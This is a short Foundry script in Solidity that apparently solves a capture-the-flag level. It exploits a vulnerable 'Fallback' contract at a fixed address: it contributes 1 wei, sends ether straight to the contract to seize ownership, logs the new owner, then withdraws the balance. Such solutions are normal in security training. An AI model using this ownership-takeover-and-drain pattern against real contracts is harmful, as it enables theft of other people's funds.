// SPDX-License-Identifier: MIT

pragma solidity 0.8.13;

import {Fallback} from "src/Fallback/Fallback.sol";
import {Script} from "lib/forge-std/src/Script.sol";
import {console} from "lib/forge-std/src/console.sol";

contract FallbackSolution is Script {
    Fallback public fallbackInstance = Fallback(payable(0xCBE0B9bd2eb04269A8f70b8788c01f0175b2F578));

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        fallbackInstance.contribute{value: 1 wei}();
        address(fallbackInstance).call{value: 1 wei}("");
        console.log("New Owner: ", fallbackInstance.owner());
        console.log("My Address: ", vm.envAddress("MY_ADDRESS"));
        fallbackInstance.withdraw();

        vm.stopBroadcast();
    }
}
